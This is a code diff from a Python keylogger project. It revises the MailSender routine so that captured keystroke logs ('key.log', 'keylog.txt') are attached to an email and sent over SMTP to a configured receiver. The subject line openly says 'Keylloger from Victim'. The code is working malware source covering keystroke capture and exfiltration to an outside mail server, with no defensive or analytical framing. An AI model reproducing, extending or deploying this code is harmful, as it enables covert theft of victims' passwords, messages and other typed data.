@@ -3,6 +3,7 @@ import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
+from email.mime.application import MIMEApplication
 from email import encoders
 from enum import Enum
 import os
@@ -29,18 +30,24 @@ class MailSender:
         #Create log and clear all old log files
         
     def send_mail(self):
+        file_paths = ["key.log","keylog.txt"];
+        body = "Attached files.";
         # Create a multipart message
         msg = MIMEMultipart();
         msg['From'] = SenderInfo.SENDER_EMAIL.value
         msg['To'] = SenderInfo.RECIEVER_EMAIL.value
         msg['Subject'] = 'Email with Attachment of Keylloger from Victim'
-         # Attach the file to the email
-        with open(self.file, 'rb') as file:
-            file_mime = MIMEBase('application', 'octet-stream')
-            file_mime.set_payload(file.read());
-        encoders.encode_base64(file_mime)
-        file_mime.add_header('Content-Disposition', 'attachment', filename=self.file)
-        msg.attach(file_mime)
+        msg.attach(MIMEText(body, "plain"))
+        
+        for file_path in file_paths:
+             # Attach the file to the email
+            with open(file_path, 'rb') as file:
+                file_mime = MIMEBase('application', 'octet-stream')
+                file_mime.set_payload(file.read());
+            encoders.encode_base64(file_mime)
+            file_mime.add_header('Content-Disposition', 'attachment', filename=file_path)
+            msg.attach(file_mime)
+
         # Create an SMTP session
         session = smtplib.SMTP(SenderInfo.MAIL_SERVER.value, SenderInfo.PORT.value)
         # Start the SMTP session
@@ -82,7 +89,7 @@ class KeyLogger:
         if key == keyboard.Key.esc:
             with open(self.log_file_path,"r") as file:
                 result_of_log = file.read();
-                print(convertLog.convert_to_readable(result_of_log))
+                print("Readable log: {}".format(convertLog.convert_to_readable(result_of_log)))
                 with open('keylog.txt',"w") as file:
                     file.write("-> Logged statement: \n============================\n" + convertLog.convert_to_readable(result_of_log));
             
